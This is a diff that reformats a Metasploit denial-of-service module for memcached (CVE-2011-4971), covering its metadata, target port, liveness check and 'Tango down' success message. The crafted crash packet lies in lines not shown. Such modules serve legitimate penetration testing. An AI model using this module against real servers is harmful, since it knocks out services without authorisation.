@@ -1,35 +1,32 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Memcached Remote Denial of Service',
-      'Description'   => %q{
-        This module sends a specially-crafted packet to cause a
-        segmentation fault in memcached v1.4.15 or earlier versions.
-      },
-      'References' =>
-        [
-          [ 'URL', 'https://code.google.com/p/memcached/issues/detail?id=192' ],
-          [ 'CVE', '2011-4971' ],
-          [ 'OSVDB', '92867' ]
-        ],
-      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
-      'License'      => MSF_LICENSE
-    ))
+                      'Name'          => 'Memcached Remote Denial of Service',
+                      'Description'   => %q(
+                        This module sends a specially-crafted packet to cause a
+                        segmentation fault in memcached v1.4.15 or earlier versions.
+                      ),
+                      'References' =>
+                        [
+                          [ 'URL', 'https://code.google.com/p/memcached/issues/detail?id=192' ],
+                          [ 'CVE', '2011-4971' ],
+                          [ 'OSVDB', '92867' ]
+                        ],
+                      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
+                      'License'      => MSF_LICENSE))
 
-    register_options([Opt::RPORT(11211),], self.class)
+    register_options([Opt::RPORT(11211)], self.class)
   end
 
   def is_alive?
@@ -40,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
       return false
     end
 
-    return true
+    true
   end
 
   def run
@@ -60,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     if is_alive?
       print_error("#{rhost}:#{rport} - The DoS attempt did not work, host is still alive")
     else
-      print_good("#{rhost}:#{rport} - Tango down")  # WWJS - What would th3j35t3r say?
+      print_good("#{rhost}:#{rport} - Tango down") # WWJS - What would th3j35t3r say?
     end
   end
 end
